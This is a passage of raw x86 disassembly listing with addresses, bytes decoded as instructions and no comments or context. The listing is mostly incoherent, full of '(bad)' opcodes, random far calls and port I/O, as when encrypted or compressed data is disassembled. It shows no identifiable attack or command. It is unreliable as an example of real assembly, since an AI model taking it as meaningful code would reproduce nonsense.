  420f3e:	stos   DWORD PTR es:[edi],eax
  420f3f:	shl    BYTE PTR [ebp+esi*4+0x7c],0x87
  420f44:	mov    dl,0x1f
  420f46:	adc    esp,DWORD PTR [ebx]
  420f48:	and    BYTE PTR [ecx],0x35
  420f4b:	push   0xe7940999
  420f50:	mov    al,0x4c
  420f52:	repz or edx,edx
  420f55:	push   eax
  420f56:	fdiv   st(2),st
  420f58:	mov    al,0x98
  420f5a:	fnstenv [ecx]
  420f5c:	loope  0x420f92
  420f5e:	push   0x44b3d8c4
  420f63:	leave  
  420f64:	fbstp  TBYTE PTR [esi+0x6c]
  420f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f68:	mov    gs,esp
  420f6a:	xor    BYTE PTR [esi+0x26],bl
  420f6d:	adc    bl,dl
  420f6f:	xor    DWORD PTR [edx-0x115fb425],esi
  420f75:	aas    
  420f76:	in     eax,dx
  420f77:	dec    ebp
  420f78:	mov    eax,0x2ca5e20b
  420f7d:	jecxz  0x420f63
  420f7f:	push   eax
  420f80:	cs xor al,0xc6
  420f83:	dec    esp
  420f84:	or     edx,DWORD PTR es:[ecx+esi*1+0x24cf3910]
  420f8c:	retf   
  420f8d:	or     edi,DWORD PTR [ecx-0x9304c45]
  420f93:	das    
  420f94:	jl     0x420f61
  420f96:	call   0x4121:0x37fdf7ec
  420f9d:	pop    esi
  420f9e:	mov    al,fs:0x9f9450fc
  420fa4:	icebp  
  420fa5:	dec    ebx
  420fa6:	jbe    0x420f35
  420fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fa9:	aaa    
  420faa:	call   0x32c2:0x189ef630
  420fb1:	inc    esp
  420fb2:	xor    BYTE PTR [eax-0x4c350e1],ah
  420fb8:	sbb    ebx,DWORD PTR [ecx]
  420fba:	fs ins DWORD PTR es:[edi],dx
  420fbc:	repnz and BYTE PTR [edi],bl
  420fbf:	pop    edx
  420fc0:	mov    dl,0x81
  420fc2:	popa   
  420fc3:	cwde   
  420fc4:	or     ah,BYTE PTR ss:[ebx-0x20]
  420fc8:	sub    al,0xb
  420fca:	sbb    al,0xa1
  420fcc:	jle    0x420f73
  420fce:	mov    esi,0x9fcd8e63
  420fd3:	jo     0x421046
  420fd5:	mov    edx,0x5c127b17
  420fda:	lods   al,BYTE PTR ds:[esi]
  420fdb:	push   edi
  420fdc:	or     BYTE PTR [ebx],0x54
  420fdf:	inc    eax
  420fe0:	int    0xd5
  420fe2:	cs rcl esi,1
  420fe5:	icebp  
  420fe6:	call   0x9b7b:0x4b905729
  420fed:	pusha  
  420fee:	lods   al,BYTE PTR ds:[esi]
  420fef:	test   al,0x5d
  420ff1:	jle    0x42100e
  420ff3:	fcom   QWORD PTR [edx]
  420ff5:	xor    al,0xd3
  420ff7:	or     ebx,DWORD PTR [edi]
  420ff9:	sub    ebx,DWORD PTR [edx-0x7ef55fd7]
  420fff:	pop    eax
  421000:	pop    eax
  421001:	mov    ecx,0x6adda7a4
  421006:	out    dx,al
  421007:	aad    0xc9
  421009:	cmp    DWORD PTR [edi+ecx*8+0x1f69a0b2],0x91f05a10
  421014:	aaa    
  421015:	or     eax,DWORD PTR [esi]
  421017:	xchg   ebp,eax
  421018:	psrlw  mm3,0xed
  42101c:	mov    edx,0xb21d6aea
  421021:	rol    DWORD PTR [ebx],0x52
  421024:	rcr    edx,cl
  421026:	mov    eax,ds:0xf30af656
  42102b:	dec    bh
  42102d:	or     BYTE PTR es:[ebx],0x3e
  421031:	in     eax,0x67
  421033:	inc    edi
  421034:	adc    eax,0x77a795c4
  421039:	sub    BYTE PTR [ebp+0x4f00c947],al
  42103f:	dec    ecx
  421040:	push   esp
  421041:	sbb    al,0x9a
  421043:	test   ecx,edx
  421045:	iret   
  421046:	inc    edx
  421047:	(bad)  
  421048:	fld    DWORD PTR [ebx]
  42104a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42104c:	xor    edx,esi
  42104e:	out    dx,eax
  42104f:	jmp    0x420fd6
  421051:	inc    eax
  421052:	xor    BYTE PTR [eax],cl
  421054:	mov    dl,0xd8
  421056:	adc    BYTE PTR [ebx+0x47],0x99
  42105a:	cwde   
  42105b:	adc    bl,BYTE PTR [edx]
  42105d:	or     ebx,edx
  42105f:	ret    
  421060:	int    0x75
  421062:	icebp  
  421063:	xor    edx,DWORD PTR [ebp-0x5129952]
  421069:	(bad)  
  42106b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42106c:	js     0x421086
  42106e:	push   edx
  42106f:	mov    dh,0x81
  421071:	xchg   esp,eax
  421072:	fnstsw WORD PTR [edx-0x584850e6]
  421078:	add    ebp,eax
  42107a:	lds    edi,FWORD PTR [ebx+0x2c99f12b]
  421080:	fnsavew [edi]
  421083:	dec    ebx
  421084:	jmp    0xc9bd1214
  421089:	jp     0x4210cd
  42108b:	fdiv   DWORD PTR [ebp+0x5aae7c05]
  421091:	(bad)  
  421092:	std    
  421093:	cmp    BYTE PTR [ebp+0x6b],0xd2
  421097:	jl     0x42108b
  421099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42109a:	and    ah,ah
  42109c:	mov    dl,0x8e
  42109e:	adc    eax,0xa63a0284
  4210a3:	xor    al,0xbe
  4210a5:	or     ecx,DWORD PTR [esi+ecx*1-0x47]
  4210a9:	in     eax,dx
  4210aa:	mov    dl,0x8e
  4210ac:	pusha  
  4210ad:	dec    eax
  4210ae:	xchg   ebx,eax
  4210af:	mov    eax,ds:0xa974e704
  4210b4:	out    dx,al
  4210b5:	or     esi,eax
  4210b7:	pop    ecx
  4210b8:	mov    ebp,0x90a7e24c
  4210bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210be:	scas   eax,DWORD PTR es:[edi]
  4210bf:	pop    ebx
  4210c0:	fisttp WORD PTR ds:0x50b26345
  4210c6:	pop    ebx
  4210c7:	push   esi
  4210c8:	xchg   esi,eax
  4210c9:	in     al,dx
  4210ca:	pop    es
  4210cb:	mov    bh,0x68
  4210cd:	or     ebp,esi
  4210cf:	ins    BYTE PTR es:[edi],dx
  4210d0:	cmp    DWORD PTR [edi+0x3],esp
  4210d3:	mov    ds:0xb09ad54b,eax
  4210d8:	aam    0x11
  4210da:	cmp    bl,BYTE PTR [ecx]
  4210dc:	retf   0xf3f
  4210df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210e0:	add    BYTE PTR [eax],cl
  4210e2:	jo     0x421072
  4210e4:	push   esp
  4210e5:	mov    edx,0x31b2d29d
  4210ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210eb:	push   eax
  4210ec:	mov    ecx,ds
  4210ee:	xchg   bh,ah
  4210f0:	mov    ds:0x3dc7de36,al
  4210f5:	mov    ds:0xeb522a69,al
  4210fa:	loop   0x421117
  4210fc:	les    esp,FWORD PTR [esi]
  4210fe:	call   0x4845:0x7f60f0f1
  421105:	pop    esp
  421106:	shl    BYTE PTR [edx+eax*1-0x47f94db0],1
  42110d:	mov    edx,0xcdfe385a
  421112:	mov    ds:0x7105e088,eax
  421117:	xchg   BYTE PTR [ebx+ecx*2-0xb],al
  42111b:	inc    eax
  42111c:	mov    al,0x2b
  42111e:	xchg   esi,eax
  42111f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421120:	cmp    DWORD PTR [eax],ebp
  421122:	loopne 0x421107
  421124:	(bad)  
  421125:	mov    esp,0x848867c8
  42112a:	sti    
  42112b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42112c:	iret   
  42112d:	inc    ebp
  42112e:	adc    edx,DWORD PTR [ecx-0x58242e8d]
  421134:	in     al,0x5f
  421136:	scas   al,BYTE PTR es:[edi]
  421137:	pop    ebp
  421138:	fs inc esi
  42113a:	retf   0xb26f
  42113d:	add    DWORD PTR [eax+ecx*1+0x2737f9b3],ecx
  421144:	loope  0x421151
  421146:	fisttp DWORD PTR [ebp-0x35]
  421149:	pop    ds
  42114a:	(bad)  
  42114b:	jnp    0x421163
  42114d:	xchg   ebp,eax
  42114e:	call   0xd1ef:0x7ae7481
  421155:	fcom   st(3)
  421157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421158:	retf   0x91e1
  42115b:	xlat   BYTE PTR ds:[ebx]
  42115c:	jae    0x4210e1
  42115e:	stos   DWORD PTR es:[edi],eax
  42115f:	pop    ds
  421160:	mov    bl,0x35
  421162:	mov    ds:0x47973b2c,al
  421167:	adc    esi,DWORD PTR [edx+0x2]
  42116a:	(bad)  
  42116b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42116c:	loope  0x421102
  42116e:	mov    BYTE PTR [ebx+0x31],dh
  421171:	int3   
  421172:	xchg   BYTE PTR [edi-0x6bfb574e],bl
  421178:	xlat   BYTE PTR ds:[ebx]
  421179:	pusha  
  42117a:	(bad)  
  42117b:	fst    QWORD PTR [edx+0x5703205]
  421181:	and    eax,0x5089a69a
  421186:	(bad)  
  421187:	pop    ebx
  421188:	mov    dl,0x54
  42118a:	cwde   
  42118b:	scas   al,BYTE PTR es:[edi]
  42118c:	add    ch,dh
  42118e:	iret   
  42118f:	retf   0xb35
  421192:	dec    esi
  421193:	in     eax,dx
  421194:	nop
  421195:	add    al,0x75
  421197:	mov    esi,0x5e9ab3ae
  42119c:	cli    
  42119d:	xchg   edx,eax
  42119e:	stc    
  42119f:	mov    ebp,0xa79d5a50
  4211a4:	jae    0x4211f2
  4211a6:	jo     0x421159
  4211a8:	add    eax,0xb22c50e7
  4211ad:	xchg   ecx,eax
  4211ae:	into   
  4211af:	xchg   esi,eax
  4211b1:	jnp    0x421209
  4211b3:	fcmove st,st(0)
  4211b5:	or     esp,esi
  4211b7:	mov    dh,0xb1
  4211b9:	ret    0xc0f9
  4211bc:	call   0x6720abc6
  4211c1:	rcl    dh,0xc3
  4211c4:	cmp    ch,BYTE PTR [ebp+0x383ba718]
  4211ca:	ds pop eax
  4211cc:	jne    0x421224
  4211ce:	das    
  4211cf:	test   al,0x40
  4211d1:	jl     0x42116d
  4211d3:	jle    0x4211b8
  4211d5:	test   ebx,esp
  4211d7:	cwde   
  4211d8:	pop    ebp
  4211d9:	xor    eax,0xa8dda74b
  4211de:	mov    esi,0xdeaf0dc3
  4211e3:	(bad)  
  4211e4:	into   
  4211e5:	push   0x4a1fc95a
  4211ea:	js     0x4211a2
  4211ec:	jns    0x4211f9
  4211ee:	(bad)  
  4211ef:	jmp    0x776933eb
  4211f4:	out    0x7b,al
  4211f6:	call   0xf40d:0x8292978e
  4211fd:	outs   dx,DWORD PTR ds:[esi]
  4211fe:	std    
  4211ff:	aas    
  421200:	sbb    cl,BYTE PTR [eax]
  421202:	je     0x421243
  421204:	inc    esp
  421205:	mov    fs,ebp
  421207:	outs   dx,DWORD PTR ds:[esi]
  421208:	sub    bh,BYTE PTR [ebx+0x78]
  42120b:	je     0x4211c2
  42120d:	add    bh,bh
  42120f:	mov    bl,0xea
  421211:	adc    edi,DWORD PTR [ebx-0x55f2cd65]
  421217:	popa   
  421218:	inc    ebp
  421219:	or     ecx,DWORD PTR ds:0x442f5a13
  42121f:	xchg   BYTE PTR [esi+0x33619a4c],ch
  421225:	add    eax,0x59876b43
  42122a:	push   cs
  42122b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42122c:	mov    edi,0xb1f24d1b
  421231:	and    bl,BYTE PTR cs:[eax]
  421234:	mov    dl,0x99
  421236:	xchg   ebp,eax
  421237:	les    esp,FWORD PTR [edi-0x6e]
  42123a:	cmp    eax,0x4e0bb891
  42123f:	inc    ecx
  421240:	mov    bh,0x88
  421242:	ss fwait
  421244:	mov    ecx,fs
  421246:	call   0x36c9:0xe85d8f7e
  42124d:	and    DWORD PTR [eax-0x59],ecx
  421250:	stos   BYTE PTR es:[edi],al
  421251:	xchg   edx,eax
  421252:	pop    esp
  421253:	stos   DWORD PTR es:[edi],eax
  421254:	or     eax,0xac3b7efc
  421259:	sbb    edx,DWORD PTR ds:0xc30b4fd6
  42125f:	push   ebx
  421260:	mov    ds:0xe54c7a7d,eax
  421265:	add    al,0x27
  421267:	sahf   
  421268:	pop    ds
  421269:	pop    eax
  42126a:	pop    edx
  42126b:	jne    0x421283
  42126d:	scas   al,BYTE PTR es:[edi]
  42126e:	mov    dl,0xe4
  421270:	mov    cl,0xdf
  421272:	iret   
  421273:	sub    BYTE PTR [esi+0x42283520],cl
  421279:	das    
  42127a:	or     al,0x87
  42127c:	ror    BYTE PTR [ebx],1
  42127e:	inc    edi
  42127f:	fst    DWORD PTR [ebx-0x51843989]
  421285:	push   ss
  421286:	popf   
  421287:	pop    ds
  421288:	enter  0x3027,0x3
  42128c:	mov    ch,0x15
  42128e:	stos   BYTE PTR es:[edi],al
  42128f:	mov    edi,0xa712b84a
  421294:	addr16 mov dh,0x4e
  421297:	cmovl  ebx,DWORD PTR [eax-0x7d4f1065]
  42129e:	sbb    ax,0xa1c2
  4212a2:	mov    ds:0x6e69c9c6,eax
  4212a7:	or     BYTE PTR [ebp+0x8],cl
  4212aa:	shl    BYTE PTR [ebp-0x646042d9],0x43
  4212b1:	stc    
  4212b2:	xchg   ebp,eax
  4212b3:	outs   dx,DWORD PTR ds:[esi]
  4212b4:	mov    al,cl
  4212b6:	call   0x2b5e:0xbeeebe67
  4212bd:	xor    eax,0x6a2da714
  4212c2:	daa    
  4212c3:	in     al,dx
  4212c4:	lods   eax,DWORD PTR ds:[esi]
  4212c5:	jo     0x4212f1
  4212c7:	mov    dl,0xb2
  4212c9:	add    eax,ebx
  4212cb:	inc    edi
  4212cc:	pusha  
  4212cd:	lods   al,BYTE PTR ds:[esi]
  4212ce:	imul   esp,DWORD PTR [esi+0xa1e0b08],0xa8033e6e
  4212d8:	sbb    DWORD PTR [ecx-0x66],ebx
  4212db:	sub    DWORD PTR [eax+0x48c43494],ebp
  4212e1:	mov    ds:0xb36d715,al
  4212e6:	ds cdq 
  4212e8:	(bad)  
  4212e9:	aaa    
  4212ea:	mov    edi,0x9be5ecc0
  4212ef:	push   eax
  4212f0:	iret   
  4212f1:	outs   dx,BYTE PTR ds:[esi]
  4212f2:	test   eax,0x56160469
  4212f7:	add    eax,0x144a0b7d
  4212fc:	push   ebp
  4212fd:	adc    eax,0x3d007343
  421302:	call   0xed5d:0x82c4fcb
  421309:	call   0x7aeabaab
  42130e:	mov    al,0x89
  421310:	or     DWORD PTR [edi+0x3f],edx
  421313:	add    al,0xb2
  421315:	add    ecx,DWORD PTR [ebp+eiz*1+0x2e124a12]
  42131c:	or     ecx,DWORD PTR [ebx]
  42131e:	dec    esi
  42131f:	dec    edi
  421320:	xor    al,0xc6
  421322:	pop    dx
  421324:	fnstenv [edx+ecx*8-0x6497bf04]
  42132b:	into   
  42132c:	sub    BYTE PTR [edi+0x2],bh
  42132f:	outs   dx,BYTE PTR ds:[esi]
  421330:	lods   al,BYTE PTR gs:[esi]
  421332:	pop    esi
  421333:	call   0x50a41f32
  421338:	push   ss
  421339:	fisub  WORD PTR [eax-0x657b26fa]
  42133f:	jnp    0x421392
  421341:	pop    edx
  421342:	mov    al,0x1b
  421344:	pop    ds
  421345:	mov    DWORD PTR [eax-0x59],ebx
  421348:	xor    DWORD PTR [esi+0x20],ebx
  42134b:	rcl    edx,0x3e
  42134e:	xchg   ebp,eax
  42134f:	push   0x8359f2b2
  421354:	outs   dx,DWORD PTR ds:[esi]
  421355:	scas   eax,DWORD PTR es:[edi]
  421356:	(bad)  
  421357:	jbe    0x42135f
  421359:	xchg   ebx,eax
  42135a:	loopne 0x421303
  42135c:	in     al,dx
  42135d:	mov    al,0xa4
  42135f:	je     0x421321
  421361:	sbb    al,0x38
  421363:	dec    esi
  421364:	mov    al,0x68
  421366:	lahf   
  421367:	and    eax,0x679b0f81
  42136c:	leave  
  42136d:	je     0x421311
  42136f:	sahf   
  421370:	call   0x7651:0x89099a64
  421377:	fs adc al,0x3f
  42137a:	add    bl,BYTE PTR [eax]
  42137c:	mov    ebx,0x11b54e73
  421381:	or     BYTE PTR [esi+eiz*1+0x7c6ad494],ch
  421388:	fwait
  421389:	int    0xf5
  42138b:	mov    ecx,0xa7e66aaa
  421390:	test   BYTE PTR [esi-0x1bca5357],ah
  421396:	call   0x5a3c:0x77739d13
  42139d:	scas   al,BYTE PTR es:[edi]
  42139e:	xchg   BYTE PTR [edi+0x22607dec],ah
  4213a4:	dec    esp
  4213a5:	fs gs inc esi
  4213a8:	enter  0x9a1d,0x72
  4213ac:	push   0x3b
  4213ae:	ja     0x421427
  4213b0:	sub    eax,DWORD PTR [eax+edx*8-0x59]
  4213b4:	push   ds
  4213b5:	les    ebp,FWORD PTR [eax-0x23423f6a]
  4213bb:	sbb    eax,0x37109ea1
  4213c0:	mov    dl,0x2a
  4213c2:	pop    ebp
  4213c3:	stc    
  4213c4:	sub    BYTE PTR [eax+edi*8-0x59],al
  4213c8:	inc    esp
  4213c9:	ja     0x42139e
  4213cb:	add    eax,0xa3e7ed1c
  4213d0:	mov    dl,0x1c
  4213d2:	sub    edi,DWORD PTR [ecx+0x53]
  4213d5:	test   DWORD PTR [edx-0x43f4f469],edx
  4213db:	xor    al,BYTE PTR [ebp-0xc]
  4213de:	push   DWORD PTR [ebp-0x37]
  4213e1:	adc    al,0x9a
  4213e3:	int3   
  4213e4:	aam    0xe9
  4213e6:	cs aad 0x7a
  4213e9:	neg    BYTE PTR [edi-0x59]
  4213ec:	jne    0x4213fd
  4213ee:	add    BYTE PTR [esi],dl
  4213f0:	push   edi
  4213f1:	(bad)
  4213f4:	mov    dl,0x31
  4213f6:	imul   DWORD PTR [eax]
  4213f8:	jbe    0x4213e6
  4213fa:	pop    eax
  4213fb:	cmp    ah,BYTE PTR [ebx+ecx*1-0xb500bf8]
  421402:	nop
  421403:	mov    dl,0x1b
  421405:	sub    DWORD PTR [edx+0x4072730f],ebx
  42140b:	ds pop ds
  42140d:	mov    cl,0x93
  42140f:	test   al,0x35
  421411:	xchg   cl,ah
  421413:	mov    cl,0x52
  421415:	in     al,dx
  421416:	arpl   WORD PTR [ebx+0x59],bp
  421419:	je     0x4213b8
  42141b:	and    al,0x42
  42141d:	inc    edx
  42141e:	inc    ebx
  42141f:	clc    
  421420:	bound  esi,QWORD PTR [ebx]
  421422:	rol    BYTE PTR [edx],0x3b
  421425:	adc    eax,0x8c95067f
  42142a:	dec    ebp
  42142b:	js     0x4213b0
  42142d:	cmp    ebp,DWORD PTR [ecx-0x1a]
  421430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421431:	xchg   ebx,eax
  421432:	mov    DWORD PTR [edi+0x58999a97],ecx
  421438:	sti    
  421439:	push   ss
  42143a:	test   eax,0x89ff7907
  42143f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421440:	ja     0x421447
  421442:	cmc    
  421443:	push   ebp
  421444:	xor    al,0x53
  421446:	push   edx
  421447:	out    0xce,eax
  421449:	xchg   ecx,eax
  42144a:	call   0x7c48:0x202f375c
  421451:	arpl   bp,dx
  421453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421454:	add    bh,BYTE PTR [eax-0x11]
  421457:	test   eax,0x551b5e43
  42145c:	add    bl,bh
  42145e:	call   0x699f:0x4f6e2309
  421465:	xlat   BYTE PTR ds:[ebx]
  421466:	das    
  421467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421468:	es or  al,0xb1
  42146b:	sbb    al,0x49
  42146d:	pop    eax
  42146e:	scas   eax,DWORD PTR es:[edi]
  42146f:	mov    eax,0xf61487b2
  421474:	jg     0x4214ed
  421476:	mov    ecx,0xbf0bd804
  42147b:	inc    edi
  42147c:	mov    ecx,0xeeb5dc82
  421481:	addr16 test ah,cl
  421484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421485:	and    DWORD PTR [ebp-0x3520d931],ebx
  42148b:	pop    esi
  42148c:	popa   
  42148d:	pop    es
  42148e:	xchg   ebp,eax
  42148f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421490:	out    0xa,al
  421492:	lahf   
  421493:	pop    ds
  421494:	pusha  
  421495:	sbb    bh,BYTE PTR [edx-0x64]
  421498:	push   ds
  421499:	loop   0x421430
  42149b:	cmp    DWORD PTR [ecx],0xffffff98
  42149e:	dec    esi
  42149f:	cli    
  4214a0:	mov    dl,0x5a
  4214a2:	jne    0x4214ac
  4214a4:	dec    edx
  4214a5:	xor    ecx,DWORD PTR [edi+0x1cdb0dae]
  4214ab:	sub    BYTE PTR [edx-0x103e4fd3],dh
  4214b1:	mov    cl,0x9a
  4214b3:	push   ds
  4214b4:	sbb    ch,0x7a
  4214b7:	mov    ah,0xda
  4214b9:	loopne 0x4214e2
  4214bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214bc:	dec    esi
  4214bd:	jae    0x421516
  4214bf:	cmp    DWORD PTR [ebx],edi
  4214c1:	out    0xf3,eax
  4214c3:	rol    ch,cl
  4214c5:	xor    eax,0x6f071694
  4214ca:	jl     0x42152c
  4214cc:	and    bl,BYTE PTR [eax+0x5b]
  4214cf:	add    edx,DWORD PTR [ecx+0x69]
  4214d2:	inc    edx
  4214d3:	daa    
  4214d4:	scas   eax,DWORD PTR es:[edi]
  4214d5:	or     esi,DWORD PTR [edi+0x15678d38]
  4214db:	xchg   edx,eax
  4214dc:	test   al,0x1a
  4214de:	push   0xe0d7b281
  4214e3:	jmp    0x34cf:0x3b6b6b5c
  4214ea:	lock sbb bh,BYTE PTR [ebp+0x7c082cfe]
  4214f1:	jg     0x421552
  4214f3:	xchg   edx,eax
  4214f4:	cmp    ebx,ecx
  4214f6:	mov    esi,0xa7ade5e0
  4214fb:	xchg   esp,eax
  4214fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214fd:	mov    eax,DWORD PTR [eax+eax*2+0x77e35e4e]
  421504:	aas    
  421505:	or     ebx,eax
  421507:	inc    ecx
  421508:	in     al,0xc8
  42150a:	mov    esp,0x23b937e4
  42150f:	addr16 out dx,al
  421511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421512:	ss pusha 
  421514:	mov    dl,0x82
  421516:	mov    ds:0x64e8b7f8,al
  42151b:	(bad)  
  42151c:	and    cl,BYTE PTR [ebx]
  42151e:	or     BYTE PTR [edi],ah
  421520:	out    0x8d,al
  421522:	mov    esi,0x9d60d3f9
  421527:	lds    eax,FWORD PTR [edx+0x70]
  42152a:	cmp    edi,DWORD PTR [edx+edx*2-0x1a]
  42152e:	jmp    0x8fd8:0x841caa7e
  421535:	or     al,0x83
  421537:	mov    cl,0x17
  421539:	cmp    esi,ebx
  42153b:	cmc    
  42153c:	mov    WORD PTR [ebx+0x7d445b9a],fs
  421542:	xchg   ebx,eax
  421543:	mov    ds:0xa0e158ad,al
  421548:	call   0x31448b97
  42154d:	or     esp,DWORD PTR [edx]
  42154f:	xchg   ebp,eax
  421550:	cmp    bl,BYTE PTR [bp+si+0x1c46]
  421555:	iret   
  421556:	cmp    ebx,DWORD PTR [ebx]
  421558:	test   al,0x8b
  42155a:	sub    DWORD PTR [eax+0xf4a3460],esp
  421560:	test   ebx,edi
  421562:	out    0x8d,eax
  421564:	fadd   QWORD PTR [edx+0x2eb22de1]
  42156a:	les    esp,FWORD PTR [edx-0x8]
  42156d:	lods   eax,DWORD PTR ds:[esi]
  42156e:	aas    
  42156f:	out    dx,al
  421570:	xor    eax,0xff418176
  421575:	add    eax,0x25e4db78
  42157a:	cli    
  42157b:	xor    al,0x3e
  42157d:	out    0xf0,eax
  42157f:	or     dh,BYTE PTR [edx-0x55a01470]
  421585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421586:	sub    DWORD PTR [ecx],ebp
  421588:	sahf   
  421589:	jb     0x4215a3
  42158b:	xlat   BYTE PTR ds:[ebx]
  42158c:	sub    BYTE PTR [ebx],cl
  42158e:	in     eax,dx
  42158f:	mov    bh,0x4
  421591:	mov    ch,0x2a
  421593:	out    dx,eax
  421594:	data16 cmp BYTE PTR [eax+eiz*8+0x6e110b8c],ah
  42159c:	push   esp
  42159d:	arpl   WORD PTR [eax],sp
  42159f:	push   eax
  4215a0:	pop    ebp
  4215a1:	or     eax,DWORD PTR [ecx-0x7f]
  4215a4:	and    DWORD PTR [ebp-0x105589f3],edx
  4215aa:	jb     0x421546
  4215ac:	mov    dl,0x6
  4215ae:	adc    eax,0x5cdeb6a4
  4215b3:	mov    cl,0x66
  4215b5:	out    dx,eax
  4215b6:	mov    cl,0x99
  4215b8:	aas    
  4215b9:	ret    0x259b
  4215bc:	out    0xce,al
  4215be:	fimul  WORD PTR [edx+0x54f4e3a0]
  4215c4:	mov    dl,0x27
  4215c6:	(bad)  
  4215c8:	imul   edx,edi,0x2e
  4215cb:	mov    cl,0x29
  4215cd:	or     esp,DWORD PTR [edi]
  4215cf:	popf   
  4215d0:	sbb    BYTE PTR [ecx+ebx*2],dh
  4215d3:	jae    0x4215c9
  4215d5:	hlt    
  4215d6:	call   0x8a96:0xac5f8b1c
  4215dd:	cld    
  4215de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215e1:	adc    dh,BYTE PTR [ebx-0x78]
  4215e4:	adc    ch,al
  4215e6:	ret    0xbc95
  4215e9:	jbe    0x4215ed
  4215eb:	push   0xffffffd7
  4215ed:	stos   DWORD PTR es:[edi],eax
  4215ee:	retf   
  4215ef:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4215f1:	add    eax,0x2f83dd8e
  4215f6:	in     al,dx
  4215f7:	fwait
  4215f8:	jp     0x421611
  4215fa:	cmp    DWORD PTR [ebp+ebx*1+0x47],esp
  4215fe:	cmp    al,0x5b
  421600:	mov    dl,0x59
  421602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421603:	neg    BYTE PTR [ebx+0x2]
  421606:	and    BYTE PTR [ebx+0x58],cl
  421609:	jle    0x42165e
  42160b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42160c:	xchg   esp,eax
  42160d:	mov    esi,0x67245047
  421612:	jnp    0x42163c
  421614:	inc    ebx
  421615:	call   FWORD PTR [ebx]
  421617:	pop    eax
  421618:	mov    dl,0x55
  42161a:	push   0xfffffff6
  42161c:	dec    eax
  42161d:	scas   al,BYTE PTR es:[edi]
  42161e:	ins    BYTE PTR es:[edi],dx
  42161f:	pop    esp
  421620:	sub    al,0xb
  421622:	mov    al,0x71
  421624:	pop    ebx
  421625:	mov    ebx,0x353bb296
  42162a:	cdq    
  42162b:	inc    ebx
  42162c:	xor    al,0xab
  42162e:	js     0x421679
  421630:	ins    BYTE PTR es:[edi],dx
  421631:	repz jno 0x42165c
  421634:	loopne 0x421641
  421636:	and    eax,0x8e6f0404
  42163b:	ins    DWORD PTR es:[edi],dx
  42163c:	shl    bh,1
  42163e:	out    0x97,al
  421640:	retf   
  421641:	neg    DWORD PTR [edx+0x6cb00312]
  421647:	xor    BYTE PTR [esi],bl
  421649:	add    DWORD PTR [eax+ebp*8],edx
  42164c:	xlat   BYTE PTR ds:[ebx]
  42164d:	mov    ebx,0x41bd9830
  421652:	add    BYTE PTR [ebp+0x32],dl
  421655:	mov    ecx,DWORD PTR [eax]
  421657:	mov    ds:0xa36cba67,al
  42165c:	cwde   
  42165d:	jg     0x42160e
  42165f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421660:	xor    DWORD PTR [eax+0x342ff8c],ecx
  421666:	outs   dx,DWORD PTR ds:[esi]
  421667:	lods   al,BYTE PTR ds:[esi]
  421668:	mov    dl,0x5c
  42166a:	icebp  
  42166b:	(bad)  
  42166c:	lock inc edx
  42166e:	pop    ebx
  42166f:	into   
  421670:	xor    ecx,DWORD PTR [ebx]
  421672:	ja     0x42163e
  421674:	adc    eax,0x43eb5725
  421679:	mul    BYTE PTR [edx-0x20]
  42167c:	mov    esp,0x68e2e865
  421681:	aad    0x9a
  421683:	push   eax
  421684:	jge    0x4216be
  421686:	cmp    esp,DWORD PTR [ecx]
  421688:	les    ecx,FWORD PTR [ebx]
  42168a:	je     0x421664
  42168c:	push   esp
  42168d:	xchg   esp,eax
  42168e:	jo     0x42167c
  421690:	ret    
  421691:	rcr    BYTE PTR [edx-0x47a77152],0x18
  421698:	mov    DWORD PTR [eax+0x28],esp
  42169b:	sti    
  42169c:	mov    al,ds:0xdd7e9a34
  4216a1:	unpckhps xmm5,XMMWORD PTR [edx-0x54]
  4216a5:	mov    ebp,0xed41829a
  4216aa:	xchg   ebp,eax
  4216ab:	ret    
  4216ac:	push   ecx
  4216ad:	mov    al,0x87
  4216af:	out    dx,eax
  4216b0:	sub    edi,ebx
  4216b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216b3:	(bad)  
  4216b4:	mov    dl,0x48
  4216b6:	sar    BYTE PTR [ebx-0x59],cl
  4216b9:	sbb    al,0xd7
  4216bb:	enter  0xa0b2,0xd6
  4216bf:	mov    ds:0x26f9c67a,eax
  4216c4:	test   DWORD PTR [ebx],0x28768b16
  4216ca:	add    ah,BYTE PTR [ecx+0x23]
  4216cd:	cmp    BYTE PTR [edx-0x573d02b],bl
  4216d3:	aaa    
  4216d4:	loopne 0x42171b
  4216d6:	lods   eax,DWORD PTR ds:[esi]
  4216d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216d8:	scas   al,BYTE PTR es:[edi]
  4216d9:	adc    DWORD PTR [eax+0x2e],eax
